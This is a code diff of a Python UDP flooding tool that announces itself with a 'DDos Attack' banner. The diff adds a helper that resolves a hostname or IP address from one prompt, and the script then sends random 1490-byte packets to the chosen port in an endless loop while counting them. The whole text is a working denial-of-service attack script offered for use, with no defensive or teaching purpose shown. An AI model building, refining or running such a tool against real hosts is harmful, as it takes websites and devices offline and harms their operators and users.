@@ -4,6 +4,14 @@ import sys
 import random
 import time
 from datetime import datetime
+from IPy import IP
+
+def checkIP(ip):
+    try:
+        IP(ip)
+        return ip
+    except ValueError :
+        return socket.gethostbyname(ip)    
 
 
 #string colors
@@ -20,16 +28,9 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet 'DDos Attack'")
 
-victim = input("enter 'w' if your victim is a website, and 'l' if it's an electronic device : ")
-if victim == 'w':
-    host = input("Website you want to DDos: ")
-    ip = socket.gethostbyname(host)
-elif victim == 'l':
-    ip = input("IP you want to DDos: ")
-else :
-    print("error !")
-    exit
+victim = input("enter target you want to DDos : ")
 
+ipadress = checkIP(victim)
 port = int(input("Port you want to attack: "))
 pers_msg = input("Enter your personnal message or signatur if you wish: ")
 
@@ -37,12 +38,12 @@ pers_msg = input("Enter your personnal message or signatur if you wish: ")
 os.system("clear")
 os.system("figlet 'DDos Attack starting ...'")
 
-print(BOLD+OKBLUE+"preparing the attack on the adress IP:",ip+ENDC+ENDC)
+print(BOLD+OKBLUE+"preparing the attack on the adress IP:",ipadress+ENDC+ENDC)
 time.sleep(5)
 sent = 0
 
 while True:
-    sockt.sendto(bytes,(ip,port))
+    sockt.sendto(bytes,(ipadress,port))
     #sockt.send(str(pers_msg).encode)
     sent +=1
     print(BOLD+"number of requests sent:",FAIL+str(sent)+ENDC+ENDC)
